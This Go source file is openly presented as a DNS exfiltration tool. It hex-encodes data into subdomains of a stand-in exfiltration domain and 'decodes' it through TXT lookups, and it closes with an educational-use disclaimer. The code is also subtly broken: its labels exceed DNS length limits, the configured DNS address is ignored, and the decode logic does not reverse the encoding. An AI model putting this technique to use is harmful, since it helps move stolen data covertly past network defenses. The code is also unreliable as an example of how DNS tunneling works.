package main

import (
	"context"
	"encoding/hex"
	"errors"
	"fmt"
	"net"
	"os"
	"strings"
	"time"
)

const exfilDomain = "exfil.example.com" // Replace with your actual exfiltration domain for testing

func Encode(data []byte, resolver *net.Resolver) string {
	if len(data) == 0 {
		return ""
	}
	enc := hex.EncodeToString(data)
	parts := make([]string, 0, (len(enc)+253)/254)
	for i := 0; i < len(enc); i += 254 {
		end := i + 254
		if end > len(enc) {
			end = len(enc)
		}
		parts = append(parts, enc[i:end])
	}
	return strings.Join(parts, ".") + "." + exfilDomain
}

func decode(domain string, resolver *net.Resolver) ([]byte, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	dnsAddr := os.Getenv("DNS_ADDR")
	if dnsAddr == "" {
		dnsAddr = "0.0.0.0:53" // Change this to your DNS server address if needed
	}
	resolver = &net.Resolver{
		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
			return net.DialTimeout(network, address, 30*time.Second)
		},
	}
	domain = strings.TrimSuffix(domain, "."+exfilDomain)
	if !strings.HasPrefix(domain, ".") {
		domain += "."
	}
	var parts []string
	for _, part := range strings.Split(domain, ".") {
		txts, err := resolver.LookupTXT(ctx, part)
		if err != nil {
			return nil, fmt.Errorf("decode: %w", errors.Join(err))
		}
		parts = append(parts, txts...)
	}
	data, _ := hex.DecodeString(strings.Join(parts, ""))
	return data, nil
}

func main() {
	resolver := &net.Resolver{}
	fmt.Printf("Encode: %x -> %s\n", []byte{0xDE, 0xAD, 0xBE, 0xEF}, Encode([]byte{0xDE, 0xAD, 0xBE, 0xEF}, resolver))
	_, err := decode(Encode([]byte{0xDE, 0xAD, 0xBE, 0xEF}, resolver), resolver)
	if err != nil {
		fmt.Fprint(os.Stderr, "decode error: ", err)
		os.Exit(1)
	}
}

// Note: The above code is a simplified example of encoding and decoding data using DNS queries. In a real-world scenario, you would need to handle DNS server configuration, error handling, and security considerations appropriately.
// this code is for educational purposes only and should not be used for malicious activities.
// Do not use this code to exfiltrate data without proper authorization and consent.
// If you are testing this code, ensure that you have permission to do so and that you are not violating any laws or regulations.
// Made by MonkeySeC - SyS, researching Group.
